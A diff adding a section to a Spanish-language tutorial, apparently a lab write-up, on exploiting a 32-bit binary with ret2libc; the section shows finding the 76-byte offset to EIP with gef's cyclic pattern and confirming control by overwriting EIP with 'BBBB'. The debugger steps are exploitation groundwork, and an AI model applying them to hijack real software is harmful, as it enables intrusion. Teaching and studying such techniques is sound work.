@@ -218,4 +218,105 @@ Personalmente creo que la diferencia es considerable. Con lo cual vemos que esta
 
 # Calculando el offset de el binario
 
-Bien en este punto es interesante que podamos conocer 
+Bien en este punto es interesante que podamos conocer el `offset` de el binario, y para los que no sepais lo que es el offset, el offset es esencial para poder explotar el ret2libc y basícamente es conocer el número de bytes exactos hasta el registro `EIP` para poder tener su control.
+
+Con lo cual para esto necesitamos generar un pattern para conocer el valor exacto de bytes. Para esto podemos usar un módulo de `metasploit` que se llama pattern-create pero el propio gef tiene incluida esta funcionalidad con lo cual lo haremos directamente desde `gef`.
+
+```sh
+gef➤  pattern create 1000
+[+] Generating a pattern of 1000 bytes (n=4)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
+[+] Saved as '$_gef0'
+gef➤
+```
+
+Ahora vamos a volver a ejecutarlo pasandole todo el `pattern`
+
+```sh
+gef➤  r 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj'
+```
+
+Y una vez ejecutado también podríamos calcular el offset pasando a little-endian con otro módulo de metasploit. Pero el propio gef también incluye esta opción así que lo haremos directamente.
+
+```sh
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffce40  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$ebx   : 0x61616172 ("raaa"?)
+$ecx   : 0xffffd500  →  0x4853006a ("j"?)
+$edx   : 0xffffd227  →  0x6173006a ("j"?)
+$esp   : 0xffffce90  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
+$ebp   : 0x61616173 ("saaa"?)
+$esi   : 0x0
+$edi   : 0xf7ffcc60  →  0x00000000
+$eip   : 0x61616174 ("taaa"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffce90│+0x0000: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"    ← $esp
+0xffffce94│+0x0004: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabia[...]"
+0xffffce98│+0x0008: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
+0xffffce9c│+0x000c: "xaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabka[...]"
+0xffffcea0│+0x0010: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
+0xffffcea4│+0x0014: "zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma[...]"
+0xffffcea8│+0x0018: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
+0xffffceac│+0x001c: "caabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboa[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x61616174
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "wvverez", stopped 0x61616174 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  pattern offset $eip
+[+] Searching for '74616161'/'61616174' with period=4
+[+] Found at offset 76 (little-endian search) likely
+gef➤
+```
+
+Pues ahora mismo sabemos que tenemos que mandar 76 bytes para que van a ser ignorados para poder tomar el control de `EIP` que es donde va a retornar el programa. Podemos comprobar si está todo correcto pasando exactamente 76 letras "A" y 4 letras "B" y la dirección a la que debería de apuntar el registro EIP es `0x42424242` que serían las “B”.
+
+Así que apoyandonos con python vamos a probarlo nuevamente. Para ello:
+
+```sh
+r $(python3 -c 'print("A"*76 + "B"*4)')
+```
+
+Bien, lo ejecutamos para comprobar
+
+```sh
+gef➤
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd1e0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x41414141 ("AAAA"?)
+$ecx   : 0xffffd500  →  0x48530042 ("B"?)
+$edx   : 0xffffd22f  →  0xffd40042 ("B"?)
+$esp   : 0xffffd230  →  0xffffd400  →  0x00000005
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x0
+$edi   : 0xf7ffcc60  →  0x00000000
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd230│+0x0000: 0xffffd400  →  0x00000005    ← $esp
+0xffffd234│+0x0004: 0x00000000
+0xffffd238│+0x0008: 0x00000000
+0xffffd23c│+0x000c: 0x565561ce  →  <main+0016> add eax, 0x2e26
+0xffffd240│+0x0010: 0x00000000
+0xffffd244│+0x0014: 0xffffd260  →  0x00000002
+0xffffd248│+0x0018: 0x56558eec  →  0x56556130  →  <__do_global_dtors_aux+0000> endbr32
+0xffffd24c│+0x001c: 0xf7d99f21  →   add esp, 0x10
+─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "wvverez", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+
+Y confirmamos que el offset es el correcto ya que el registro EIP se sobre escribe con nuestras B.
+
